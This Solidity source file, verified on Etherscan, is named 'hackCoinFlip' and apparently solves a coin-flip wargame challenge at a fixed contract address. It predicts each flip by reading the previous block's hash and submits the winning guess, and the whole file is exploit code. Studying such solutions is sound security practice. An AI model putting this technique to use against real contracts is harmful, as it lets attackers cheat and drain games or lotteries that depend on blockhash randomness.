/**
 *Submitted for verification at Etherscan.io on 2021-10-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract hackCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x34758Bf68076524CD475dE1b0Becba4C4b9C0033); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        if (side == _guess) {
          originalContract.flip(_guess);
        } else {
          originalContract.flip(!_guess);
        }
    }
}